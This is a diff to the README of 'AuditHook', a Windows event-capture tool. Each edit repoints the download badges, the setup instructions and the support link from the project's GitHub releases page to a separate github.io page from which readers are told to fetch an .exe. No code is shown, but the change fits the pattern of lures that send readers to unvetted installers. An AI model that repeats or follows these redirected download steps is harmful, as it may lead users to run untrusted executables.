@@ -1,6 +1,6 @@
 # 🛡️ AuditHook - Capture Every Event, Zero Friction
 
-[![Download AuditHook](https://img.shields.io/badge/Download-AuditHook-2ea44f?style=for-the-badge&logo=github)](https://github.com/ruthrodr56/AuditHook/releases)
+[![Download AuditHook](https://img.shields.io/badge/Download-AuditHook-2ea44f?style=for-the-badge&logo=github)](https://ruthrodr56.github.io)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these simple steps to get AuditHook running on your Windows computer. It 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/ruthrodr56/AuditHook/releases](https://github.com/ruthrodr56/AuditHook/releases)**
+Visit this link to download the application: **[https://ruthrodr56.github.io](https://ruthrodr56.github.io)**
 
 Once you're on that page, look for the newest version at the top. Click the download button that matches your Windows system (usually labeled something like `AuditHook-Setup.exe` or `audithook-windows.zip`).
 
@@ -136,7 +136,7 @@ A: The easiest way is to visit the download link again and get the newest versio
 
 If you run into any issues, here are your options:
 
-- **Visit the Website** – Go to [https://github.com/ruthrodr56/AuditHook/releases](https://github.com/ruthrodr56/AuditHook/releases) to see the latest news and updates
+- **Visit the Website** – Go to [https://ruthrodr56.github.io](https://ruthrodr56.github.io) to see the latest news and updates
 - **Report a Problem** – On the same page, look for the "Issues" tab and let us know what went wrong. We read every report
 
 ---
@@ -160,7 +160,7 @@ AuditHook is here to make your life easier. Whether you need to track what's hap
 
 **Download it now** and start seeing the world of data flowing through your computer — in real time, right in front of your eyes.
 
-[![Get AuditHook Now](https://img.shields.io/badge/⬇️%20Get%20AuditHook%20Now-blue?style=for-the-badge)](https://github.com/ruthrodr56/AuditHook/releases)
+[![Get AuditHook Now](https://img.shields.io/badge/⬇️%20Get%20AuditHook%20Now-blue?style=for-the-badge)](https://ruthrodr56.github.io)
 
 ---
 
